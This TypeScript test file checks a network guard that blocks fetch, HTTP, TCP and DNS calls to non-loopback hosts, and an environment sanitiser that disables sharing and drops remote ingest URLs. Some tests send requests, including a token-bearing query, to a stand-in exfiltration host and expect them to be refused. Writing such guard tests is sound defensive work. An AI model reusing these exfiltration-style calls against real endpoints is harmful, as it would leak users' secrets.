import { afterAll, beforeAll, describe, expect, test } from "bun:test"
import dns from "node:dns"
import http from "node:http"
import net from "node:net"
import fs from "node:fs"
import os from "node:os"
import path from "node:path"
import { Blocked, blocked, connector, fetcher, lookuper, requester, resolver } from "../src/guard"
import { child, forced } from "../src/env"

const server = Bun.serve({
  port: 0,
  hostname: "127.0.0.1",
  fetch(req): Response {
    const url = new URL(req.url)
    if (url.pathname === "/out") return Response.redirect("https://exfil.invalid/steal", 302)
    if (url.pathname === "/hop") return Response.redirect(`${url.origin}/ok`, 302)
    return new Response("ok")
  },
})
const origin = `http://127.0.0.1:${server.port}`
const log = path.join(os.tmpdir(), `albert-guard-${process.pid}.log`)

beforeAll(() => {
  process.env.ALBERT_GUARD_LOG = log
})

afterAll(() => {
  server.stop(true)
  delete process.env.ALBERT_GUARD_LOG
  fs.rmSync(log, { force: true })
})

describe("fetch", () => {
  const guarded = fetcher(globalThis.fetch)

  test("reaches loopback", async () => {
    expect(await (await guarded(`${origin}/ok`)).text()).toBe("ok")
  })

  test("follows redirects that stay allowed", async () => {
    expect(await (await guarded(`${origin}/hop`)).text()).toBe("ok")
  })

  test("refuses an external host and logs it", async () => {
    const err = await guarded("https://exfil.invalid/x?token=secret").catch((e) => e)
    expect(err).toBeInstanceOf(Blocked)
    expect(blocked().at(-1)?.target).toBe("https://exfil.invalid/x")
    const lines = fs.readFileSync(log, "utf8").trim().split("\n")
    expect(lines.at(-1)).toContain("exfil.invalid")
    expect(lines.at(-1)).not.toContain("secret")
  })

  test("refuses a redirect from an allowed host to an external one", async () => {
    const err = await guarded(`${origin}/out`).catch((e) => e)
    expect(err).toBeInstanceOf(Blocked)
    expect((err as Blocked).kind).toBe("redirect")
  })

  test("accepts Request objects", async () => {
    const err = await guarded(new Request("https://exfil.invalid/")).catch((e) => e)
    expect(err).toBeInstanceOf(Blocked)
  })
})

describe("node clients", () => {
  test("http.request refuses external hosts", () => {
    const request = requester(http.request, "http:")
    expect(() => request("http://exfil.invalid/")).toThrow(Blocked)
    expect(() => request({ hostname: "exfil.invalid", port: 80 })).toThrow(Blocked)
  })

  test("http.request reaches loopback", async () => {
    const request = requester(http.request, "http:")
    const body = await new Promise<string>((resolve, reject) => {
      const req = request(`${origin}/ok`, (res: http.IncomingMessage) => {
        res.setEncoding("utf8")
        let data = ""
        res.on("data", (chunk: string) => (data += chunk))
        res.on("end", () => resolve(data))
      })
      req.on("error", reject)
      req.end()
    })
    expect(body).toBe("ok")
  })

  test("net.connect refuses external hosts but allows unix sockets and loopback", () => {
    const connect = connector(net.connect, "tcp")
    expect(() => connect(443, "exfil.invalid")).toThrow(Blocked)
    expect(() => connect({ host: "10.1.2.3", port: 80 })).toThrow(Blocked)
    const sock = connect({ host: "127.0.0.1", port: server.port! }) as net.Socket
    sock.destroy()
  })

  test("dns lookups outside the policy fail", async () => {
    const lookup = lookuper(dns.lookup)
    const err = await new Promise((resolve) => lookup("exfil.invalid", (e: unknown) => resolve(e)))
    expect(err).toBeInstanceOf(Blocked)
    const resolve4 = resolver(dns.promises.resolve4)
    expect(await resolve4("exfil.invalid").catch((e: unknown) => e)).toBeInstanceOf(Blocked)
  })

  test("dns lookups of loopback names succeed", async () => {
    const lookup = lookuper(dns.lookup)
    const addr = await new Promise((resolve) => lookup("localhost", (_: unknown, a: unknown) => resolve(a)))
    expect(typeof addr).toBe("string")
  })
})

describe("env", () => {
  test("forces the kill switches and drops remote endpoints", () => {
    const env = child({ KILO_DISABLE_SHARE: "false", KILO_SESSION_INGEST_URL: "https://x", HOME: "/h" })
    expect(env.KILO_DISABLE_SHARE).toBe("true")
    expect(env.KILO_SESSION_INGEST_URL).toBeUndefined()
    expect(env.HOME).toBe("/h")
    for (const [key, value] of Object.entries(forced)) expect(env[key]).toBe(value)
  })
})
